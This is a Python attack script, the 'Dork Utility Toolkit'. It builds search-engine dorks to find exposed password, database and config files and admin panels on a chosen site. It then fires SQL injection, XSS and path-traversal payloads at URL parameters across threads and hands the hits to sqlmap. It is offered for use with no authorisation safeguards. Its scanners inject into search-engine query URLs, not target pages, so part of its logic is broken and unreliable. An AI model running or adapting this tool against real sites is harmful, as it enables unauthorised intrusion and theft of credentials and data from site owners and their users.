
import os
import random
import requests
import urllib.parse
import re
import subprocess
from tqdm import tqdm
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

DEFAULT_KEYWORDS = ["password", "invoice", "login", "backup", "user", "secret", "config", "email", "database"]
FILETYPES = ["log", "sql", "env", "json", "zip", "bak", "txt", "xml", "yml"]
INURLS = ["admin", "cpanel", "auth", "dashboard", "user", "private", "secure"]
INTITLES = ["admin panel", "login", "index of", "dashboard", "portal", "control panel"]

def load_custom_keywords():
    path = "keywords.txt"
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            words = [line.strip() for line in f if line.strip()]
        if words:
            print(f"✅ Loaded {len(words)} custom keywords from '{path}'")
            return words
    print(f"⚠️ Using default keywords (no 'keywords.txt' found or file is empty).")
    return DEFAULT_KEYWORDS

def ensure_keywords_file():
    path = "keywords.txt"
    if not os.path.exists(path) or os.stat(path).st_size == 0:
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(DEFAULT_KEYWORDS))
        print(f"✅ Created or restored default 'keywords.txt' with {len(DEFAULT_KEYWORDS)} keywords.")
    else:
        print("✅ 'keywords.txt' already exists and has content.")

def generate_dorks(site, count, category):
    keywords = load_custom_keywords()
    combos = []
    for _ in range(count * 2):
        k = random.choice(keywords)
        f = random.choice(FILETYPES)
        u = random.choice(INURLS)
        t = random.choice(INTITLES)
        base = random.choice([
            f'intext:{k} filetype:{f}',
            f'inurl:{u} filetype:{f}',
            f'intitle:"{t}" intext:{k}',
            f'inurl:{u} intitle:"{t}"',
            f'filetype:{f} intext:{k}'
        ])
        combos.append(f"site:{site} {base}")
    return list(set(combos))[:count]

def preview_dorks(dorks, preview_count=5):
    print("\n🔍 Live Dork Preview:")
    for dork in dorks[:preview_count]:
        print("[+] " + dork)

def save_dorks(dorks, filename="generated_dorks.txt"):
    unique_dorks = sorted(set(dorks))
    with open(filename, "w", encoding="utf-8") as f:
        for dork in unique_dorks:
            f.write(dork + "\n")
    print(f"\n✅ {len(unique_dorks)} unique dorks saved to '{filename}'.")

def convert_dorks_to_urls(engine):
    input_file = "generated_dorks.txt"
    output_file = "dork_urls.txt"
    if not os.path.exists(input_file):
        print("❌ 'generated_dorks.txt' not found. Please generate dorks first.")
        return
    with open(input_file, "r", encoding="utf-8") as f:
        dorks = [line.strip() for line in f if line.strip()]
    engines = {
        "google": "https://www.google.com/search?q=",
        "bing": "https://www.bing.com/search?q=",
        "duckduckgo": "https://duckduckgo.com/?q=",
        "yandex": "https://yandex.com/search/?text="
    }
    if engine not in engines:
        print("❌ Invalid engine. Use: google, bing, duckduckgo, yandex")
        return
    base = engines[engine]
    search_urls = [base + urllib.parse.quote_plus(dork) for dork in dorks]
    with open(output_file, "w", encoding="utf-8") as f:
        for url in search_urls:
            f.write(url + "\n")
    print(f"\n✅ Converted {len(search_urls)} dorks to '{engine}' URLs in '{output_file}'.")

def test_dorks(engine):
    engines = {
        "google": "https://www.google.com/search?q=",
        "bing": "https://www.bing.com/search?q=",
        "duckduckgo": "https://duckduckgo.com/html/?q=",
        "yandex": "https://yandex.com/search/?text="
    }
    if engine not in engines:
        print("❌ Invalid engine.")
        return
    url_base = engines[engine]
    if not os.path.exists("generated_dorks.txt"):
        print("❌ 'generated_dorks.txt' not found.")
        return
    with open("generated_dorks.txt", "r", encoding="utf-8") as f:
        dorks = [line.strip() for line in f if line.strip()]
    print(f"\n🔍 Testing {len(dorks)} dorks using {engine.title()}...\n")
    results = []
    headers = {"User-Agent": "Mozilla/5.0"}
    for dork in tqdm(dorks):
        url = url_base + urllib.parse.quote_plus(dork)
        try:
            r = requests.get(url, headers=headers, timeout=10)
            found = "No results found" not in r.text and "did not match any documents" not in r.text
            results.append(f"[{'OK' if found else 'NO'}] {dork}")
        except Exception as e:
            results.append(f"[ERROR] {dork} - {e}")
    with open("dork_test_results.txt", "w", encoding="utf-8") as f:
        for res in results:
            f.write(res + "\n")
    print("\n✅ Dork test results saved to 'dork_test_results.txt'.")

def find_vulnerable_urls():
    if not os.path.exists("dork_urls.txt"):
        print("❌ 'dork_urls.txt' not found. Run dork URL conversion first.")
        return
    with open("dork_urls.txt", "r", encoding="utf-8") as f:
        urls = [line.strip() for line in f if line.strip().startswith("http")]
    test_payloads = {
        "SQLi": "' OR '1'='1",
        "XSS": "<script>alert(1)</script>",
        "LFI": "../../etc/passwd"
    }
    headers = {"User-Agent": "Mozilla/5.0"}
    results = []

    def test_url(base_url):
        found = []
        if "?" not in base_url:
            return None
        for vuln_type, payload in test_payloads.items():
            injected_url = re.sub(r"(=)[^&]*", r"\1" + urllib.parse.quote_plus(payload), base_url)
            try:
                response = requests.get(injected_url, headers=headers, timeout=8)
                content = response.text.lower()
                if payload.lower() in content or "sql" in content or "syntax" in content or                    "alert(1)" in content or "etc/passwd" in content:
                    found.append(vuln_type)
            except Exception:
                continue
        if found:
            return f"[VULNERABLE] {base_url} => {', '.join(found)}"
        return None

    print("\n🔎 Scanning for vulnerable parameters...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_url, url) for url in urls]
        for future in tqdm(futures):
            result = future.result()
            if result:
                results.append(result)
    with open("vuln_test_results.txt", "w", encoding="utf-8") as f:
        for line in results:
            f.write(line + "\n")
    print("\n✅ Vulnerability scan complete. Results saved to 'vuln_test_results.txt'.")

ADVANCED_SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR 1=1#",
    '\" OR \"\"=\"\"',
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--+"
]

def deep_sql_injection_scan():
    if not os.path.exists("dork_urls.txt"):
        print("❌ 'dork_urls.txt' not found. Run dork URL conversion first.")
        return
    with open("dork_urls.txt", "r", encoding="utf-8") as f:
        urls = [line.strip() for line in f if line.strip().startswith("http")]
    headers = {"User-Agent": "Mozilla/5.0"}
    results = []

    def test_advanced_sqli(base_url):
        if "?" not in base_url:
            return None
        for payload in ADVANCED_SQLI_PAYLOADS:
            injected_url = re.sub(r"(=)[^&]*", r"\1" + urllib.parse.quote_plus(payload), base_url)
            try:
                response = requests.get(injected_url, headers=headers, timeout=10)
                if any(keyword in response.text.lower() for keyword in ["syntax", "mysql", "sql"]):
                    return f"[ADV_SQLI] {base_url} => Payload: {payload}"
            except Exception:
                continue
        return None

    print("\n🔎 Performing deep SQLi scan...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_advanced_sqli, url) for url in urls]
        for future in tqdm(futures):
            result = future.result()
            if result:
                results.append(result)
    with open("deep_sqli_results.txt", "w", encoding="utf-8") as f:
        for line in results:
            f.write(line + "\n")
    print("✅ Deep SQLi scan complete. Results saved to 'deep_sqli_results.txt'.")

def run_sqlmap_on_vulnerable_urls():
    input_file = "vuln_test_results.txt"
    output_dir = "sqlmap_output"
    if not os.path.exists(input_file):
        print("❌ 'vuln_test_results.txt' not found. Run vulnerability scan first.")
        return
    os.makedirs(output_dir, exist_ok=True)
    with open(input_file, "r", encoding="utf-8") as f:
        lines = [line.strip() for line in f if line.startswith("[VULNERABLE]")]
    if not lines:
        print("⚠️ No vulnerable URLs to test with SQLMap.")
        return
    print("\n🔧 Running SQLMap on found vulnerable URLs...\n")
    for index, line in enumerate(lines, 1):
        try:
            url = line.split("] ", 1)[1].split(" => ")[0].strip()
            print(f"[{index}/{len(lines)}] Testing: {url}")
            output_path = os.path.join(output_dir, f"sqlmap_{index}.txt")
            cmd = [
                "sqlmap", "-u", url,
                "--batch", "--crawl=1", "--level=2",
                "--risk=1", "--threads=5", "--output-dir=."
            ]
            with open(output_path, "w", encoding="utf-8") as out:
                subprocess.run(cmd, stdout=out, stderr=subprocess.STDOUT)
        except Exception as e:
            print(f"❌ Failed to run SQLMap on {url}: {e}")
    print("\n✅ SQLMap scans complete. Output saved to 'sqlmap_output/' folder.")

def main():
    while True:
        print("\n=== Dork Utility Toolkit ===")
        print("[1] Generate Dorks")
        print("[2] Convert Dorks to Search URLs")
        print("[3] Test Dorks Against Search Engine")
        print("[4] Scan Dork URLs for Vulnerabilities")
        print("[5] Create/Verify 'keywords.txt'")
        print("[6] Deep SQL Injection Scan")
        print("[7] Run SQLMap on Vulnerable URLs")
        print("[0] Exit")
        choice = input("Enter your choice: ").strip()
        if choice == "1":
            site = input("Enter target site (e.g. example.com): ").strip()
            count = int(input("How many dorks to generate? "))
            dorks = generate_dorks(site, count, "default")
            preview_dorks(dorks)
            save_dorks(dorks)
        elif choice == "2":
            engine = input("Choose engine (google/bing/duckduckgo/yandex): ").strip().lower()
            convert_dorks_to_urls(engine)
        elif choice == "3":
            engine = input("Choose engine (google/bing/duckduckgo/yandex): ").strip().lower()
            test_dorks(engine)
        elif choice == "4":
            find_vulnerable_urls()
        elif choice == "5":
            ensure_keywords_file()
        elif choice == "6":
            deep_sql_injection_scan()
        elif choice == "7":
            run_sqlmap_on_vulnerable_urls()
        elif choice == "0":
            print("👋 Exiting...")
            break
        else:
            print("❌ Invalid choice. Try again.")

if __name__ == "__main__":
    main()
